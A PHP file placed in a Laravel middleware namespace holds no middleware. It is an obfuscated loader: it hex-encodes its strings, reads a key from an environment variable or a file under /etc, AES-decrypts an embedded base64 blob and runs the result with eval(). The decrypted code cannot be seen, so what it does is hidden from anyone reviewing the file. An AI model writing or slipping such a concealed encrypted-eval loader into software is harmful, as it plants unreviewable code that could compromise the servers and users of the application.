<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('07clpoS6NoxKLkGNaqxpHA==');

$c=base64_decode(

'utaMFltRHolwkckQ1/dT84bjJrk0oBfUuvOCL2ucSs0Z4j7RQLgqUDvR3eOWkHUkDD8lyVH9OaTP' .
'e332nRLx0pa7AftX7hkuni1ooAOtlj3X3KyICkZ9TdltIRmDo1Xt8zZl0uGNr/lAkMm61bgVFIeo' .
'VoenTpm5h6P3hZemi/6J9WGgSX6OCaBHCISflqwLb3elVzTiD6lvdGFHEzA2p5pWSCvSsO8Te/z7' .
'g/5CxIcKVKMIOsoA1YZEo6bHhkyvc4P8jG6RMWZQ3ANmBUSqRadQ2SqhAwDI8QhMbt74SEDMDZ0X' .
'R5d5jvKlMfjnMW53iMzgedlZysgN42vR8rWhQyr5IWWup2rdo0o0idRahl7eTxkxL9Lh6TmEX7Tc' .
'Q7g2EYYrS/XYg+GwJ2LXvGznI+S2NTVHrtClRU0IMz00VTEcIHJzARWWr2397w2H94pFaZJ+fnqE' .
'Y7FSgponHttzcGPIeDvnR4L+x+/WYIACGDnsHPZr2Qoke9OWelMS+9HYAiz8k6/9LFoQChTjX0BF' .
'D+h1v04nLA/+tke5bxcYERYj68NlcW/HTVHNt50dtgl3vbKX+nTPxofcV22fA+PMyrh6AVuyL0sT' .
'/5lCuZBgSpOWe2BmA3jQlhJTDrE3Eo+cDqQkfi8uaSv0yYUHHcn2tQKcs/kiUq7/Ll62TOEMdZ1J' .
'3E9nHXL9rL6kxpABlw4AjoZa66yfyXIV2js9NYECIDl7azXhFGVmNfKNPRvRN6/rVlcYTlrtIfbK' .
'Nt1A+dqKYb//o8+NjUXidUpQWGcQm26c0lmmlLnF9e6+Ml/+f9gpu7LiG/xDa16PLMzZH9TE0hgu' .
'V+Zzf7U91Nh9X2/lt2PNaHnK7PI7WHJ0IecDsbLFGQokwcgPYlp7kaMF3iBZDI6aEosSNbcVBt7W' .
'dQ04XmP63BZ457Q1EZL8xKG0SY+hV/Ehe02E9gwrsWZWPM0BBW6DKNIVsnRxZlg9bS8fa/Emq8Jy' .
'3C5caDJHq+dmIqrO/hzch27RrxSloFr07OgVt+Z5joAAZ5wIALTRyzBy3RBSdfScDiMCvNOKquqc' .
'Hv1n1DcTfm7rMX3lvk4awuN1xeWlMXLRS4u+PIwce6XUQgdgYE6/d2qkccJfhj5c3bGobyWM2kH1' .
'j35Im1jOPd1GoP0j9dt4okGsMVnuOjYfXnbyxKQbt2I39STCo0DqBl/A9qgFHXYu+JC5jojwwKSN' .
'R67V+mpDQwvY8OINigUn0xui4rl3xHNLVOz4Y/y3Z4h2pzB5Zp13RpV3zxZElUTBx9Ki5+yUOfWA' .
'1dzpX6dtJtvbpsLYMDCE2llbXIhmEM4QTzGyP7QbB2kN0r/575KsF8s09X6cd7imx1epCfwudZAL' .
'qJjUN2L7HEWUrq+TDkvvVEjTY4AZRE5isMXuI8BTPNatYYwL1h0HKI823mp6axJmNerGXonlhp+q' .
'3bv1pxsDVrfAqHj92mqpLk95SRiHQSdcoyFZufYCXk+V80KXhOzn0sJTXm2epKS00ev4HKVpd5xY' .
'B6gHwINPfohK0BKZnW0YHR83QyHsWii9BbAPzw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

